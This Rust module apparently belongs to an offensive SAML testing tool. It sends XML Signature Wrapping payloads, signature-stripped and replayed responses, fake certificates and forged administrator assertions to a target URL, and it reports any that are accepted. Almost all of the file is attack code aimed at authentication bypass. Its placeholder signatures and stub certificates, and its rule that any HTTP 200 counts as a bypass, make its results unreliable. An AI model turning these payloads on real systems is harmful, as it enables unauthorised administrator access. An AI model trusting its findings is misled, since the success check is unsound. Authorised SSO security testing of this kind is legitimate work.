use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

const XSW_PAYLOADS: &[&str] = &[
    r##"<?xml version='1.0'?><samlp:Response xmlns:samlp='urn:oasis:names:tc:SAML:2.0:protocol' ID='_response' Version='2.0'><samlp:Status><samlp:StatusCode Value='urn:oasis:names:tc:SAML:2.0:status:Success'/></samlp:Status><saml:Assertion xmlns:saml='urn:oasis:names:tc:SAML:2.0:assertion' ID='_attacker'><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject><saml:AttributeStatement><saml:Attribute Name='role'><saml:AttributeValue>administrator</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion><ds:Signature xmlns:ds='http://www.w3.org/2000/09/xmldsig#'><ds:SignedInfo><ds:CanonicalizationMethod Algorithm='http://www.w3.org/2001/10/xml-exc-c14n#'/><ds:SignatureMethod Algorithm='http://www.w3.org/2000/09/xmldsig#rsa-sha1'/><ds:Reference URI='#_response'><ds:Transforms><ds:Transform Algorithm='http://www.w3.org/2000/09/xmldsig#enveloped-signature'/><ds:Transform Algorithm='http://www.w3.org/2001/10/xml-exc-c14n#'/></ds:Transforms><ds:DigestMethod Algorithm='http://www.w3.org/2000/09/xmldsig#sha1'/><ds:DigestValue>PLACEHOLDER=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>PLACEHOLDER==</ds:SignatureValue></ds:Signature></samlp:Response>"##,
    r##"<?xml version='1.0'?><samlp:Response xmlns:samlp='urn:oasis:names:tc:SAML:2.0:protocol' ID='_response' Version='2.0'><ds:Signature xmlns:ds='http://www.w3.org/2000/09/xmldsig#'><ds:SignedInfo><ds:Reference URI='#_real'><ds:DigestValue>PLACEHOLDER=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>PLACEHOLDER==</ds:SignatureValue></ds:Signature><samlp:Status><samlp:StatusCode Value='urn:oasis:names:tc:SAML:2.0:status:Success'/></samlp:Status><saml:Assertion ID='_real'><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion ID='_evil'><saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>"##,
];

const ASSERTION_FORGE: &[&str] = &[
    r#"{"assertion":{"subject":"admin@target.com","attributes":{"role":"administrator","group":"admins"},"conditions":{"not_before":"2024-01-01T00:00:00Z","not_on_or_after":"2099-12-31T23:59:59Z"}}}"#,
    r#"{"assertion":{"subject":"root@target.com","attributes":{"role":"superuser","permissions":["*"]},"authn_context":"urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"}}"#,
];

pub async fn xsw(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    println!("{} SAML XML Signature Wrapping (XSW)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!(
        "{} {} XSW variants",
        "[*]".cyan().bold(),
        XSW_PAYLOADS.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut results = Vec::new();

    for (i, payload) in XSW_PAYLOADS.iter().enumerate() {
        let mut req = client.post(url).header("Content-Type", "application/xml");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let bypassed = body.contains("admin")
                    || body.contains("authenticated")
                    || body.contains("success")
                    || status == 200;
                let tag = if bypassed {
                    "BYPASSED".red().bold().to_string()
                } else {
                    "rejected".green().to_string()
                };
                println!(
                    "  {} XSW variant {} status={} {}",
                    "*".cyan(),
                    i + 1,
                    status,
                    tag
                );
                if bypassed {
                    println!(
                        "    {} Response: {}",
                        ">".red().bold(),
                        body.chars().take(300).collect::<String>()
                    );
                    results.push(true);
                }
            }
            Err(_) => {
                println!("  {} XSW variant {} error", "*".red(), i + 1);
            }
        }
    }

    println!(
        "\n{} {} / {} XSW attacks succeeded",
        "[*]".cyan().bold(),
        results.len(),
        XSW_PAYLOADS.len()
    );
    Ok(())
}

pub async fn response(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    println!("{} SAML Response Manipulation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let manipulations = [
        (
            "Remove signature",
            r#"{"saml_response":"<Response><Assertion><Subject>admin</Subject></Assertion></Response>","strip_signature":true}"#,
        ),
        (
            "Replay assertion",
            r#"{"saml_response":"<Response><Assertion ID='_replay'><Subject>admin</Subject></Assertion></Response>","replay":true}"#,
        ),
        (
            "Modify recipient",
            r#"{"saml_response":"<Response><Assertion><Subject>admin</Subject><Conditions><AudienceRestriction>https://evil.com</AudienceRestriction></Conditions></Assertion></Response>"}"#,
        ),
        (
            "Extend validity",
            r#"{"saml_response":"<Response><Assertion><Subject>admin</Subject><Conditions NotOnOrAfter='2099-12-31T23:59:59Z'/></Assertion></Response>"}"#,
        ),
    ];

    let mut results = Vec::new();
    for (name, payload) in &manipulations {
        let mut req = client.post(url).header("Content-Type", "application/json");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let success =
                    body.contains("admin") || body.contains("authenticated") || status == 200;
                let tag = if success {
                    "ACCEPTED".red().bold().to_string()
                } else {
                    "rejected".green().to_string()
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if success {
                    results.push(name.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} {} / {} manipulations accepted",
        "[*]".cyan().bold(),
        results.len(),
        manipulations.len()
    );
    Ok(())
}

pub async fn cert(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SAML Certificate Confusion", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let cert_tests = [
        (
            "Self-signed cert",
            r#"{"cert":"-----BEGIN CERTIFICATE-----\nMIID...ATTACKER...\n-----END CERTIFICATE-----"}"#,
        ),
        (
            "Wrong issuer cert",
            r#"{"cert":"-----BEGIN CERTIFICATE-----\nMIID...WRONGISSUER...\n-----END CERTIFICATE-----"}"#,
        ),
        (
            "Expired cert",
            r#"{"cert":"-----BEGIN CERTIFICATE-----\nMIID...EXPIRED2000...\n-----END CERTIFICATE-----"}"#,
        ),
        (
            "Attacker cert match",
            r#"{"cert":"-----BEGIN CERTIFICATE-----\nMIID...SAMENAMEATTACKER...\n-----END CERTIFICATE-----"}"#,
        ),
    ];

    let mut results = Vec::new();
    for (name, payload) in &cert_tests {
        match client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload.to_string())
            .send()
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accepted = body.contains("valid") || body.contains("verified") || status == 200;
                let tag = if accepted {
                    "ACCEPTED".red().bold().to_string()
                } else {
                    "rejected".green().to_string()
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if accepted {
                    results.push(name.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} {} / {} cert tests accepted",
        "[*]".cyan().bold(),
        results.len(),
        cert_tests.len()
    );
    Ok(())
}

pub async fn assertion(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    println!("{} SAML Assertion Forgery", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!(
        "{} {} forged assertions",
        "[*]".cyan().bold(),
        ASSERTION_FORGE.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut results = Vec::new();

    for (i, payload) in ASSERTION_FORGE.iter().enumerate() {
        let mut req = client.post(url).header("Content-Type", "application/json");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accepted = body.contains("admin")
                    || body.contains("authenticated")
                    || body.contains("success")
                    || status == 200;
                let tag = if accepted {
                    "FORGED".red().bold().to_string()
                } else {
                    "rejected".green().to_string()
                };
                println!(
                    "  {} Assertion {} status={} {}",
                    "*".cyan(),
                    i + 1,
                    status,
                    tag
                );
                if accepted {
                    println!(
                        "    {} Response: {}",
                        ">".red().bold(),
                        body.chars().take(300).collect::<String>()
                    );
                    results.push(true);
                }
            }
            Err(_) => {
                println!("  {} Assertion {} error", "*".red(), i + 1);
            }
        }
    }

    println!(
        "\n{} {} / {} forged assertions accepted",
        "[*]".cyan().bold(),
        results.len(),
        ASSERTION_FORGE.len()
    );
    Ok(())
}
